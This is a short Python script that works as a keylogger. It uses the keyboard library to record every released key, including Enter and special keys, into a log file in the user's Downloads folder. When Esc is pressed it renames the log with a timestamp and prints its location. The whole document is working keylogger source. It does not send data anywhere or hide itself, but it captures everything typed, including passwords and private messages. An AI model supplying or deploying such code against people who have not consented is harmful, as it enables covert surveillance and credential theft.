import keyboard
import os
from datetime import datetime

# Function to log keystrokes
def log_keystroke(event):
    key = event.name
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "[ENTER]\n"
        elif key == "decimal":
            key = "."
        else:
            key = f"[{key}]"
    with open(os.path.join(os.path.expanduser("~"), "Downloads", "keystrokes.log"), "a") as f:
        f.write(key)

# Set up listener
keyboard.on_release(log_keystroke)

# Wait for Esc key to terminate
keyboard.wait("esc")

# Create a timestamp for the filename
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
filename = f"keystrokes_{timestamp}.log"

# Move keystrokes.log to the new filename
downloads_directory = os.path.join(os.path.expanduser("~"), "Downloads")
os.rename(os.path.join(downloads_directory, "keystrokes.log"), os.path.join(downloads_directory, filename))

print(f"Keystrokes logged in: {os.path.join(downloads_directory, filename)}")
